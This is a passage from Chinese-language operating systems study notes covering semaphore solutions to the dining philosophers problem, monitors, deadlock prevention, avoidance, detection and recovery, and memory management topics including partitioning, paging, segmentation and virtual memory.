}\n}\n```\n\n以上当5个进程并发执行，每个哲学家同时拿起自己左边的筷子，在拿起右边的筷子的时候会发生阻塞，因为每个右边的筷子都被邻居占据了，每个哲学家都等待邻居放下筷子，造成“死锁”。\n\n如何防止死锁的发生呢？\n\n①可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐。这样可以保证至少有一个哲学家是可以拿到左右两支筷子的。\n\n②要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一支筷子，另一个会直接阻塞。这就避免了占有一支后再等待另一支的情况。\n\n③各个哲学家拿筷子这件事必须互斥地执行。这就保证了即使一个哲学家在拿筷子拿到一半时被阻塞，也不会有别的哲学家继续尝试拿筷子。这样的话，当前正在吃饭的哲学家放下筷子后，被阻塞的哲学家就可以获得等待的筷子了。\n\n```c\nsemaphore chopstick[5] = {1,1,1,1,1};\nsemaphore mutex = 1;\t\t//互斥地取筷子\nPi()\t\t\t\t\t\t//i号哲学家的进程\n{\n    while(1)\n    {\n        P(mutex);\n        P(chopstick[i]);\t\t//拿左\n        P(chopstick[(i+1)%5]);\t//拿右\n        V(mutex);\n        吃饭...\n        V(chopstick[i]);\t\t//放左\n        V(chopstick[(i+1)%5]);\t//放右\n        思考...\n    }\n}\n```\n\n## 2.11 管程\n\n信号量机制存在的问题：编写程序困难、易出错，由此引入“管程”成分——一种高级同步机制。\n\n管程是一种特殊的软件模块，由这些部分组成：\n\n- 局部于管程的共享数据结构说明\n- 对该数据结构进行操作的一组过程\n- 对局部于管程的共享数据设置初始值的语句\n- 管程有一个名字\n\n管程的基本特征：\n\n- 局部于管程的数据只能被局部于管程的过程所访问\n- 一个进程只有通过调用管程内的过程才能进入管程访问共享数据\n- 每次仅允许一个进程在管程内执行某个内部过程\n\n### 2.11.1 用管程解决生产者消费者问题\n\n```c\nmonitor ProducerConsumer\n    condition full, empty;\t\t//条件变量用来实现同步(排队)\n\t\t\t\t\t\t\t\t//管程中设置条件变量和等待/唤醒操作，以解决同步问题\n    int count = 0;\t\t\t\t//缓冲区中的产品数\n    void insert(Item item){\t\t//把产品item放入缓冲区\n        \t\t\t\t\t\t//由编译器负责实现各进程互斥地进入管程中的过程\n        if(count == N)\n            wait(full);\n        count++;\n        insert_item(item);\n        if(count == 1)\n            signal(empty);\n    }\n    Item remove(){\t\t\t\t//从缓冲区中取出一个产品\n        if(count == 0)\n            wait(empty);\n        count--;\n        if(count == N-1)\n            signal(full);\n        return remove_item();\n    }\nend monitor;\n\n//生产者进程\nproducer(){\n    while(1){\n        item = 生产一个产品;\n        ProducerConsumer.insert(item);\n    }\n}\n\n//消费者进程\nconsumer(){\n    while(1){\n        item = ProducerConsumer.remove();\n        消费产品item;\n    }\n}\n```\n\n**每次仅允许一个进程在管程内执行某个内部过程。**\n\n引入管程的目的无非就是要更方便地实现进程互斥和同步。\n\n1. 需要在管程中定义共享数据(如生产者消费者问题的缓冲区)\n2. 需要在管程中定义用于访问这些共享数据的“入口”——其实就是一些函数(如生产者消费者问题中，可以定义一个函数用于将产品放入缓冲区，再定义一个函数用于从缓冲区取出产品)\n3. 只有通过这些特定的“入口”才能访问共享数据\n4. 管程中有很多“入口”，但是每次只能开放其中一个“入口”，并且只能让一个进程或线程进入(如生产者消费者问题中，各进程需要互斥地访问共享缓冲区。管程的这种特性即可保证一个时间段内最多只会有一个进程在访问缓冲区。注意：这种互斥特性是由编译器负责实现的，程序员不用关心)\n5. 可在管程中设置条件变量及等待/唤醒操作以解决同步问题。可以让一个进程或线程在条件变量上等待(此时，该进程应先释放管程的使用权，也就是让出“入口”)；可以通过唤醒操作将等待在条件变量上的进程或线程唤醒\n\n程序员可以用某种特殊的语法定义一个管程(比如：monitor ProducerConsumer...end monitor;)，之后其他程序员就可以使用这个管程提供的特定“入口”很方便地使用实现进程同步/互斥了。\n\n### 2.11.2 Java中类似于管程的机制\n\nJava中，如果用关键字`synchronized`来描述一个函数，那么这个函数同一时间段内只能被一个线程调用。\n\n```java\nstatic class monitor{\n    private Item buffer[] = new Item[N];\n    private int count = 0;\n    \n    /**\n    每次只能有一个线程进入insert函数，如果多个线程同时调用insert函数，则后来者需要排队等待\n    */\n    public synchronized void insert(Item item){\n        ......\n    }\n}\n```\n\n## 2.12 死锁\n\n死锁：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。\n\n饥饿：由于长期得不到想要的资源，某进程无法向前推进的现象。比如：在短进程优先(SPF)算法中，若有源源不断的短进程到来，则长进程将一直得不到处理机，从而发生长进程“饥饿”。\n\n死循环：某进程执行过程中一直跳不出某个循环的现象。有时是因为程序逻辑bug导致的，有时是程序员故意设计的。\n\n产生死锁必须同时满足以下四个条件，只要其中任一条件不成立，死锁就不会发生。\n\n- 互斥条件：只有对必须互斥使用的资源的争抢才会导致死锁(如哲学家的筷子、打印机设备)\n- 不可剥夺条件：进程所获得的资源在未使用完之前，不能由其它进程强行夺走，只能主动释放\n- 请求和保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其它进程占有，此时请求进程被阻塞，但又对自己已有的资源保持不放\n- 循环等待条件：存在一种进程资源的循环等待链，链中的每一个进程已获得的资源同时被下一个进程所请求\n\n什么时候会发生死锁？\n\n- 对系统资源的竞争。各进程对不可剥夺的资源(如打印机)的竞争可能引起死锁，对可剥夺的资源(CPU)的竞争是不会引起死锁的\n- 进程推进顺序非法。请求和释放资源的顺序不当，也同样会导致死锁。例如，并发执行的进程P1、P2分别申请并占有了资源R1、R2，之后进程P1又紧接着申请资源R2，而进程P2又申请资源R1，两者会因为申请的资源被对方占有而阻塞，从而发生死锁\n- 信号量的使用不当也会造成死锁。如生产者-消费者问题中，如果实现互斥的P操作在实现同步的P操作之前，就有可能导致死锁(可以把互斥信号量、同步信号量也看作是一种抽象的系统资源)\n\n### 2.12.1 死锁的处理策略——预防死锁\n\n我们知道，死锁的产生必须是满足四个必要条件，只要其中一个或几个条件不满足，死锁就不会发生。\n\n#### 2.12.1.1 破坏互斥条件\n\n互斥条件：只有对必须互斥使用的资源的争抢才会导致死锁。\n\n如果把只能互斥使用的资源改造为允许共享使用，则系统不会进入死锁状态。比如：**SPOOLing技术**。操作系统可以采用SPOOLing技术把独占设备在逻辑上改造成共享设备。比如，用SPOOLing技术将打印机改造为共享设备。\n\n{% asset_img 2.12.1.1.png SPPOLing技术 %}\n\n该策略的缺点：并不是所有的资源都可以改造成可共享使用的资源。并且为了系统安全，很多地方还必须保护这种互斥性。因此，很多时候都无法破坏互斥条件。\n\n#### 2.12.1.2 破坏不剥夺条件\n\n不可剥夺条件：进程所获得的资源在未使用完之前，不能由其它进程强行夺走，只能主动释放。\n\n破坏不剥夺条件：\n\n方案一：当某个进程请求新的资源得不到满足时，它必须立即释放保持的所有资源，待以后需要时再重新申请。也就是说，即使某些资源尚未使用完，也需要主动释放，从而破坏了不可剥夺条件。\n\n方案二：当某个进程需要的资源被其它进程所占有的时候，可以由操作系统协助，将想要的资源强行剥夺。这种方式一般需要考虑各进程的优先级(比如：剥夺调度方式，就是将处理机资源强行剥夺给优先级更高的进程使用)。\n\n该策略的缺点：\n\n1. 实现起来比较复杂\n2. 释放已获得的资源可能造成前一阶段工作的失效。因此这种方法一般只适用于易保存和恢复状态的资源，如CPU\n3. 反复地申请和释放资源会增加系统开销，降低系统吞吐量\n4. 若采用方案一，意味着只要暂时得不到某个资源，之前获得的哪些资源就都需要放弃，以后再重新申请。如果一直发生这样的情况，就会导致进程饥饿\n\n#### 2.12.1.3 破坏请求和保持条件\n\n请求和保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求，而该资源又被其它进程占有，此时请求进程被阻塞，但又对自己已有的资源保持不放。\n\n可以采用**静态分配**方法，即进程在运行前一次申请完它所需要的全部资源，在它的资源未满足前，不让它投入运行。一旦投入运行后，这些资源就一直归它所有，该进程就不会在请求别的任何资源了。\n\n该策略实现起来简单，但也有明显的缺点：有些资源可能只需要用很短的时间，因此如果进程的整个运行期间都一直保持着所有资源，就会造成严重的资源浪费，资源利用率极低。另外，该策略也有可能导致某些进程饥饿。\n\n#### 2.12.1.4 破坏循环等待条件\n\n循环等待条件：存在一种进程资源的循环等待链，链中的每一个进程已获得的资源同时被下一个进程所请求。\n\n可采用**顺序资源分配法**。首先给系统中的资源编号，规定每个进程必须按编号递增的顺序请求资源，同类资源(即编号相同的资源)一次申请完。\n\n原理分析：一个进程只有已占有小编号资源时，才有资格申请更大编号的资源。按此规则，已持有大编号资源的进程不可能逆向回来申请小编号的资源，从而就不会产生循环等待的现象。\n\n{% asset_img 2.12.1.4.png 顺序资源分配法 %}\n\n该策略的缺点：\n\n1. 不方便增加新的设备，因为可能需要重新分配所有编号\n2. 进程实际使用资源的顺序可能和编号递增顺序不一致，会导致资源浪费\n3. 必须按规定次序申请资源，用户编程麻烦\n\n### 2.12.2 死锁的处理策略——避免死锁(银行家算法)\n\n安全序列：如果系统按照这种序列分配资源，则每个进程都能顺利完成。只要能找出一个安全序列，系统就是安全状态。当然，安全序列可能有多个。\n\n如果分配了资源之后，系统中找不到任何一个安全序列，系统就进入了不安全状态。这就意味着之后可能所有进程都无法顺利地执行下去。当然，如果有进程提前归还了一些资源，那系统也有可能重新回到安全状态，不过我们在分配资源之前总是要考虑到最坏情况。\n\n如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁(处于不安全状态未必就是发生了死锁，但发生死锁时一定是在不安全状态)。因此可以在资源分配之前预先判断这次分配是否会导致系统进入不安全状态，以此决定是否答应资源分配请求，如果会进入不安全状态，就暂时不答应这次请求，让该进程先阻塞等待，这也是“银行家算法”的核心思想。\n\n{% asset_img 2.12.2.png 银行家算法 %}\n\n{% asset_img 2.12.2.1.png 银行家算法 %}\n\n{% asset_img 2.12.2.2.png 银行家算法 %}\n\n{% asset_img 2.12.2.3.png 银行家算法 %}\n\n{% asset_img 2.12.2.4.png 银行家算法 %}\n\n### 2.12.3 检测和解除\n\n如果系统中既不采取预防死锁的措施，也不采取避免死锁的措施，系统就很可能发生死锁。在这种情况下，系统应当提供两个算法：\n\n1. 死锁检测算法：用于检测系统状态，以确定系统中是否发生了死锁\n2. 死锁解除算法：当认定系统中已经发生了死锁，利用该算法可将系统从死锁状态中解脱出来\n\n#### 2.12.3.1 死锁的检测\n\n为了能对系统是否已发生了死锁进行检测，必须：\n\n①用某种数据结构来保存资源的请求和分配信息；\n\n②提供一种算法，利用上述信息来检测系统是否已进入死锁状态。\n\n{% asset_img 2.12.3.1.png 检测死锁 %}\n\n{% asset_img 2.12.3.2.png 检测死锁 %}\n\n{% asset_img 2.12.3.3.png 检测死锁 %}\n\n{% asset_img 2.12.3.4.png 检测死锁 %}\n\n#### 2.12.3.2 死锁的解除\n\n一旦检测出死锁的发生，就应该立即解除死锁。\n\n补充：并不是系统中所有的进程都是死锁状态，用死锁检测算法化简资源分配图后，还连着边的那些进程就是死锁进程。\n\n解除死锁的主要方法有：\n\n1. 资源剥夺法。挂起(暂时放到外存上)某些死锁进程，并抢占它的资源，将这些资源分配给其它的死锁进程。但是应防止被挂起的进程长时间得不到资源而饥饿\n2. 撤销进程法(或称终止进程法)。强制撤销部分、甚至全部死锁的进程，并剥夺这些进程的资源。这种方式的优点是实现简单，但所付出的代价可能会很大。因为有些进程可能已经运行了很长时间，已经接近结束了，一旦被终止可谓功亏一篑\n3. 进程回退法。让一个或多个死锁进程回退到足以避免死锁的地步。这就要求系统要记录进程的历史信息，设置还原点\n\n如何决定牺牲哪个进程？\n\n1. 进程优先级\n2. 已执行多长时间\n3. 还要多久能完成\n4. 进程已经使用了多少资源\n5. 进程是交互式的还是批处理式的\n\n# 3. 内存管理\n\n## 3.1 基础知识\n\n内存是用于存放数据的硬件。程序执行前需要先放到内存中才能被CPU处理。\n\n在多道程序环境下，系统中会有多个程序并发执行，也就是说会有多个程序的数据需要同时放到内存中。那么，如何区分各个程序的数据是放在什么地方的呢？给内存的存储单元编地址。\n\n内存地址从0开始，每个地址对应一个存储单元。如果计算机“按字节编址”，则每个存储单元大小为1字节，即1B，即8个二进制位；如果字长为16位的计算机“按字编址”，则每个存储单元大小为1个字，每个字的大小为16个二进制位。\n\n{% asset_img 3.1.png 存储单元 %}\n\n{% asset_img 3.1.1.png 程序运行的基本原理 %}\n\n装入的三种方式(用三种不同的方法完成逻辑地址到物理地址的转换)：\n\n1. 绝对装入：在编译时，如果知道程序将放到内存中的哪个位置，编译程序将产生绝对地址的目标代码。装入程序按照装入模块中的地址，将程序和数据装入内存。绝对装入只适用于单道程序环境。\n2. 静态重定位：又称可重定位装入。编译、链接后的装入模块的地址都是从0开始的，指令中使用的地址、数据存放的地址都是相对于起始地址而言的逻辑地址。可根据内存的当前情况，将装入模块装入到内存的适当位置。装入时对地址进行“重定位”，将逻辑地址变换为物理地址(地址变换是在装入时一次完成的)。静态重定位的特点是在一个作业装入内存时，必须分配其要求的全部内存空间，如果没有足够的内存，就不能装入该作业。作业一旦进入内存后，在运行期间就不能再移动，也不能再申请内存空间。\n3. 动态重定位：又称动态运行时装入。编译、链接后的装入模块的地址都是从0开始的。装入程序把装入模块装入内存后，并不会立即把逻辑地址转换为物理地址，而是把地址转换推迟到程序真正要执行时才进行。因此装入内存后所有的地址依然是逻辑地址。这种方式需要一个重定位寄存器的支持。采用动态重定位时允许程序在内存中发生移动，并且可将程序分配到不连续的存储区中；在程序运行前只需装入它的部分代码即可投入运行，然后在程序运行期间，根据需要动态申请分配内存；便于程序段的共享，可以向用户提供一个比存储空间大得多的地址空间。\n\n链接的三种方式：\n\n1. 静态链接：在程序运行之前，先将各目标模块及它们所需的库函数链接成一个完整的可执行文件(装入模块)，之后不再拆开。\n2. 装入时动态链接：将各目标模块装入内存时，边装入边链接的链接方式。\n3. 运行时动态链接：在程序执行中需要该目标模块时，才对它进行链接。其优点是便于修改和更新，便于实现对目标模块的共享。\n\n## 3.2 内存管理\n\n操作系统作为系统资源的管理者，当然也需要对内存进行管理，要管些什么呢？\n\n1. 操作系统负责内存空间的分配与回收\n2. 操作系统需要提供某种技术从逻辑上对内存空间进行扩充\n3. 操作系统需要提供地址转换功能，负责程序的逻辑地址与物理地址的转换\n4. 操作系统需要提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰\n\n内存保护可采取两种方法：\n\n1. 在CPU设置一对上、下限寄存器，存放进程的上、下限地址。进程的指令要访问某个地址时，CPU检查是否越界。\n2. 采用重定位寄存器(又称基址寄存器)和界地址寄存器(又称限长寄存器)进行越界检查。重定位寄存器中存放的是进程的起始物理地址。界地址寄存器中存放的是进程的最大逻辑地址。\n\n## 3.3 内存空间的扩充\n\n### 3.3.1 覆盖技术\n\n早期的计算机内存很小，比如IBM推出的第一台PC机最大只支持1MB大小的内存。因此经常会出现内存大小不够的情况。后来人们引入了覆盖技术，用来解决“程序大小超过物理内存总和”的问题。\n\n覆盖技术的思想：将程序分为多个段(多个模块)。常用的段常驻内存，不常用的段在需要时调入内存。\n\n内存中分为一个“固定区”和若干个“覆盖区”。需要常驻内存的段放在“固定区”中，调入后就不再调出(除非运行结束)，不常用的段放在“覆盖区”，需要用到时调入内存，用不到时调出内存。(按照自身逻辑结构，让那些不可能同时被访问的程序段共享同一个覆盖区)\n\n必须由程序员声明覆盖结构，操作系统完成自动覆盖。缺点：对用户不透明，增加了用户编程负担。\n\n### 3.3.2 交换技术\n\n交换(对换)技术的设计思想：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存(进程在内存与磁盘间动态调度)。\n\n中级调度(内存调度)，就是要决定将哪个处于挂起状态的进程重新调入内存。(看2.8.1)\n\n暂时换出外存等待的进程状态为挂起状态，挂起态又可以进一步细分为就绪挂起、阻塞挂起两种状态。(看2.8.2)\n\n{% asset_img 3.3.2.png 交换技术 %}\n\n### 3.3.3 连续分配管理方式\n\n连续分配：指为用户进程分配的必须是一个连续的内存空间。\n\n#### 3.3.3.1 单一连续分配\n\n在单一连续分配方式中，内存被分为系统区和用户区。系统区通常位于内存的低地址部分，用于存放操作系统相关数据；用户区用于存放用户进程相关数据。内存中只能有一道用户程序，用户程序独占整个用户区空间。\n\n优点：实现简单；无外部碎片；可以采用覆盖技术扩充内存；不一定需要采取内存保护。\n\n缺点：只能用于单用户、单任务的操作系统中；有内部碎片；存储器利用率极低。\n\n内部碎片：分配给某进程的内存区域中，如果有些部分没有用上，就是“内部碎片”。\n\n#### 3.3.3.2 固定分区分配\n\n20世纪60年代出现了支持多道程序的系统，为了能在内存中装入多道程序，且这些程序之间又不会相互干扰，于是将整个用户空间划分为若干个固定大小的分区，在每个分区中只装入一道作业，这样就形成了最早的、最简单的一种可运行多道程序的内存管理方式。\n\n固定分区分配又分为分区大小相等和分区大小不相等：\n\n- 分区大小相等：缺乏灵活性，但是很适合用于用一台计算机控制多个相同对象的场合(比如：钢铁厂有n个相同的炼钢炉，就可把内存分为n个大小相等的区域存放n个炼钢炉控制程序)。\n- 分区大小不等：增加了灵活性，可以满足不同大小的进程需求。根据常在系统中运行的作业大小情况进行划分(比如：划分多个小分区、适量中等分区、少量大分区)。\n\n操作系统需要建立一个数据结构——分区说明表，来实现各个分区的分配与回收。每个表项对应一个分区，通常按分区大小排列。每个表项包括对应分区的大小、起始地址、状态(是否已分配)。\n\n{% asset_img 3.3.3.2.png 固定分区分配 %}\n\n#### 3.3.3.3 动态分区分配\n\n动态分区分配又称为可变分区分配。这种分配方式不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要，因此系统分区的大小和数目是可变的。\n\n思考：\n\n1. 系统要用什么样的数据结构记录内存的使用情况？\n2. 当很多个空闲分区都能满足需求时，应该选择哪个分区进行分配？\n3. 如何进行分区的分配与回收操作？\n\n{% asset_img 3.3.3.3.1.png 问题1 %}\n\n{% asset_img 3.3.3.3.2.png 问题2 %}\n\n{% asset_img 3.3.3.3.3.png 问题3 %}\n\n{% asset_img 3.3.3.3.4.png 问题3 %}\n\n{% asset_img 3.3.3.3.5.png 问题3 %}\n\n{% asset_img 3.3.3.3.6.png 问题3 %}\n\n动态分区分配没有内部碎片，但是有外部碎片。\n\n内部碎片：分配给某进程的内存区域中，有些部分没有用上。\n\n外部碎片：内存中的某些空闲分区由于太小而难以利用。\n\n如果内存中空闲空间的总和本来可以满足某进程的要求，但由于进程需要的是一整块连续的内存空间，因此这些“碎片”不能满足进程的需求。可以通过紧凑(拼凑)技术来解决外部碎片。\n\n### 3.3.4 动态分区分配算法\n\n#### 3.3.4.1 首次适应算法\n\n算法思想：每次都从低地址开始查找，找到第一个能满足大小的空闲分区。\n\n如何实现：空闲分区以地址递增的次序排列。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。\n\n#### 3.3.4.2 最佳适应算法\n\n算法思想：由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区域。因此为了保证当“大进程”到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区，即，优先使用更小的空闲区。\n\n如何实现：空闲分区按容量递增次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。\n\n#### 3.3.4.3 最坏适应算法\n\n又称最大适应算法。\n\n算法思想：为了解决最佳适应算法的问题——即留下太多难以利用的小碎片，可以在每次分配时优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。\n\n如何实现：空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。\n\n缺点：每次都选最大的分区进行分配，虽然可以让分配后留下的空闲区更大，更可用，但是这种方式会导致较大的连续空闲区被迅速用完。如果之后有“大进程”到达，就没有内存分区可用了。\n\n#### 3.3.4.4 临近适应算法\n\n算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查找结束的位置开始检索，就能解决上述问题。\n\n如何实现：空闲分区以地址递增的顺序排列(可排成一个循环链表)。每次分配内存时从上次查找结束的位置开始查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。\n\n首次适应算法每次都要从头查找，每次都需要检索低地址的小分区。但是这种规则也决定了当低地址部分有更小的分区可以满足需求时，会更有可能用到低地址部分的小分区，也会更有可能把高地址部分的大分区保留下来(最佳适应算法的优点)。\n\n临近适应算法的规则可能会导致无论低地址、高地址部分的空闲分区都有相同的概率被使用，也就导致了高地址部分的大分区更可能被使用，划分为小分区，最后导致无大分区可用(最大适应算法的缺点)。\n\n综合来看，四种算法中，**首次适应算法**的效果反而更好。\n\n### 3.3.5 非连续分配管理方式\n\n支持多道程序的两种连续分配方式：\n\n1. 固定分区分配：缺乏灵活性，会产生大量的内部碎片，内存利用率很低\n2. 动态分区分配：会产生很多外部碎片，虽然可以用“紧凑”技术来处理，但是“紧凑”的时间代价很高\n\n如果允许将一个进程分散地装入到许多不相邻的分区中，便可充分地利用内存，而无需再进行“紧凑”。基于这一思想，产生了“非连续分配方式”，或者称为“离散分配方式”。\n\n#### 3.3.5.1 基本分页存储管理\n\n基本分页存储管理的思想：把内存分为一个个相等的小分区，再按照分区大小把进程拆分成一个个小部分。\n\n{% asset_img 3.3.5.1.png 分页存储管理 %}\n\n将进程地址空间分页之后，操作系统该如何实现逻辑地址到物理地址的转换？模块在内存中的“起始地址” + 目标内存单元相对于起始位置的“偏移量”。\n\n{% asset_img 3.3.5.1.1.png 实现地址转换 %}\n\n{% asset_img 3.3.5.1.2.png 实现地址转换 %}\n\n结论：如果每个页面大小为$2^K$B，用二进制数表示逻辑地址，则末尾K位即为页内偏移量，其余部分就是页号。\n\n因此，如果让每个页面的大小为2的整数幂，计算机就可以很方便地得出一个逻辑地址对应的页号和页内偏移量。\n\n{% asset_img 3.3.5.1.3.png 逻辑地址结构 %}\n\n为了能知道进程的每个页面在内存中存放的位置，操作系统要为每个进程建立一张页表。\n\n{% asset_img 3.3.5.1.4.png 页表 %}\n\n{% asset_img 3.3.5.1.5.png 页表 %}\n\n##### 3.3.5.1.1 基本地址变换机构\n\n基本地址变换机构可以借助进程的页表将逻辑地址转换为物理地址。通常会在系统中设置一个页表寄存器(PTR)，存放页表在内存中的起始地址F和页表长度M。进程未执行时，页表的起始地址和页表长度放在进程控制块(PCB)中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。\n\n{% asset_img 3.3.5.1.1.1.png 基本地址变换机构 %}\n\n{% asset_img 3.3.5.1.1.2.png 基本地址变换机构 %}\n\n{% asset_img 3.3.5.1.1.3.png 基本地址变换机构 %}\n\n基本地址变换机构需要两次访问内存，第一次访问内存是查页表，第二次访问内存是访问目标内存单元。\n\n##### 3.3.5.1.2 具有快表的地址变换机构\n\n是基本地址变换机构的改进版本。\n\n局部性原理：\n\n- 时间局部性：如果执行了程序中的某条指令，那么不久后这条指令很有可能再次执行；如果某个数据被访问过，不久之后该数据很可能再次被访问。(因为程序中存在大量的循环)\n- 空间局部性：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也很有可能被访问。(因为很多数据在内存中都是连续存放的)\n\n基本地址变换机构中，每次要访问一个逻辑地址，都需要查询内存中的页表。由于局部性原理，可能连续很多次查到的都是同一个页表项。既然如此，能否利用这个特性减少访问页表的次数呢？\n\n快表，又称联想寄存器(TLB)，是一种访问速度比内存快很多的高速缓冲存储器，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。\n\n{% asset_img 3.3.5.1.2.1.png 快表机制 %}\n\n{% asset_img 3.3.5.1.2.2.png 快表机制 %}\n\n##### 3.3.5.1.3 两级页表\n\n单级页表存在的问题：①页表必须连续存放，因此当页表很大时，需要占用很多个连续的页框；②没有必要让整个页表常驻内存，因为进程在一段时间内可能只需要访问几个特定的页面。\n\n解决问题一：\n\n{% asset_img 3.3.5.1.3.1.png 问题一 %}\n\n{% asset_img 3.3.5.1.3.2.png 问题一 %}\n\n{% asset_img 3.3.5.1.3.3.png 问题一 %}\n\n解决问题二：\n\n{% asset_img 3.3.5.1.3.4.png 问题二 %}\n\n{% asset_img 3.3.5.1.3.5.png 小细节 %}\n\n#### 3.3.5.2 基本分段存储管理\n\n进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每个段都有一个段名(在低级语言中，程序员使用段名来编程)，每段从0开始编址。\n\n内存分配规则：以段为单位进行分配，每个段在内存中占据连续空间，但各段之间可以不相邻。\n\n{% asset_img 3.3.5.2.1.png 基本分段存储管理 %}\n\n{% asset_img 3.3.5.2.2.png 基本分段存储管理 %}\n\n{% asset_img 3.3.5.2.3.png 基本分段存储管理 %}\n\n{% asset_img 3.3.5.2.4.png 基本分段存储管理 %}\n\n#### 3.3.5.3 分段、分页管理的对比\n\n页是信息的物理单位。分页的主要目的是为了实现离散分配，提高内存利用率。分页仅仅是系统管理上的需要，完全是系统行为，对用户是不可见的。\n\n段是信息的逻辑单位。分段的主要目的是更好地满足用户需求。一个段通常包含着一组属于一个逻辑模块的信息。分段对用户是可见的，用户编程时需要显式地给出段名。\n\n页的大小固定且由系统决定。段的长度却不固定，决定于用户编写的程序。\n\n分页的用户进程地址空间是一维的，程序员只需给出一个记忆符即可表示一个地址。分段的用户进程地址空间是二维的，程序员在标识一个地址时，既要给出段名，也要给出段内地址。\n\n{% asset_img 3.3.5.3.1.png 分段分页管理的对比 %}\n\n{% asset_img 3.3.5.3.2.png 分段分页管理的对比 %}\n\n分段存储中也可以引入快表机制。\n\n#### 3.3.5.4 段页式存储管理\n\n##### 3.3.5.4.1 分页、分段的优缺点\n\n|          | 优点                                                     | 缺点                                                         |\n| -------- | -------------------------------------------------------- | ------------------------------------------------------------ |\n| 分页管理 | 内存空间利用率高，不会产生外部碎片，只会有少量的页内碎片 | 不方便按照逻辑模块实现信息的共享和保护                       |\n| 分段管理 | 很方便按照逻辑模块实现信息的共享和保护                   | 如果段长过大，为其分配很大的连续空间会很不方便。另外，段式管理会产生外部碎片 |\n\n##### 3.3.5.4.2 段页式管理\n\n{% asset_img 3.3.5.4.2.png 段页式管理 %}\n\n{% asset_img 3.3.5.4.2.1.png 段页式管理 %}\n\n{% asset_img 3.3.5.4.2.2.png 段页式管理 %}\n\n### 3.3.6 虚拟内存\n\n{% asset_img 3.3.6.1.png 传统管理方式的特征 %}\n\n局部性原理：(看3.3.5.1.2)\n\n高速缓冲技术的思想：将近期会频繁访问到的数据放到更高速的存储器中，暂时用不到的数据放在更低速存储器中。快表机构就是将近期常访问的页表项副本放到更高速的联想寄存器中。\n\n{% asset_img 3.3.6.2.png 虚拟内存的定义和特征 %}\n\n虚拟内存有以下三个主要特征：\n\n- 多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调入内存\n- 对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入、换出\n- 虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量\n\n{% asset_img 3.3.6.3.png 实现虚拟内存技术 %}\n\n#### 3.3.6.1 请求分页管理方式\n\n{% asset_img 3.3.6.4.png 请求分页管理方式 %}\n\n{% asset_img 3.3.6.5.png 缺页中断 %}\n\n缺页中断是因为当前执行的指令想要访问的目标页面未调入内存而产生的，因此属于内中断。\n\n一条指令在执行期间，可能产生多次缺页中断。(如：copy A to B，即将逻辑地址A中的数据复制到逻辑地址B，而A、B属于不同的页面，则有可能产生两次中断)\n\n{% asset_img 3.3.6.6.png 请求分页地址变换机构 %}\n\n{% asset_img 3.3.6.7.png 请求分页地址变换机构 %}\n\n#### 3.3.6.2 页面置换算法\n\n{% asset_img 3.3.6.8.png 页面置换算法 %}\n\n##### 3.3.6.2.1 最佳置换算法(OPT)\n\n{% asset_img 3.3.6.9.png 最佳置换算法 %}\n\n最佳置换算法可以保证最低的缺页率，但实际上只有在进程执行的过程中才能知道接下来会访问到的是哪个页面。操作系统无法提前预判页面访问序列。因此，最佳置换算法是无法实现的。\n\n##### 3.3.6.2.2 先进先出置换算法(FIFO)\n\n{% asset_img 3.3.6.10.png 先进先出置换算法 %}\n\n##### 3.3.6.2.3 最近最久未使用置换算法(LRU)\n\n{% asset_img 3.3.6.11.png 最近最久未使用置换算法 %}\n\n##### 3.3.6.2.4 时钟置换算法(CLOCK)\n\n{% asset_img 3.3.6.12.png 简单时钟置换算法 %}\n\n{% asset_img 3.3.6.13.png 改进型时钟置换算法 %}\n\n#### 3.3.6.3 页面分配策略\n\n{% asset_img 3.3.6.14.png 页面分配策略 %}\n\n{% asset_img 3.3.6.15.png 页面分配策略 %}\n\n{% asset_img 3.3.6.16.png 页面分配策略 %}\n\n{% asset_img 3.3.6.17.png 页面分配策略 %}\n\n抖动(颠簸)现象：刚刚换出的页面马上又要换入内存，刚刚换入的页面马上又要换出外存，这种频繁的页面调度行为称为抖动，或颠簸。产生抖动的主要原因是进程频繁访问的页面数目高于可用的物理块数(分配给进程的物理块不够)。\n\n为进程分配的物理块太少，会使进程发生抖动现象。为进程分配的物理块太多，又会降低系统整体的并发度，降低某些资源的利用率。为了研究应该为每个进程分配多少个物理块，Denning提出了进程“工作集”的概念。\n\n{% asset_img 3.3.6.18.png 工作集 %}\n\n# 4. 文件\n\n文件：一组有意义的信息/数据集合。\n\n## 4.1 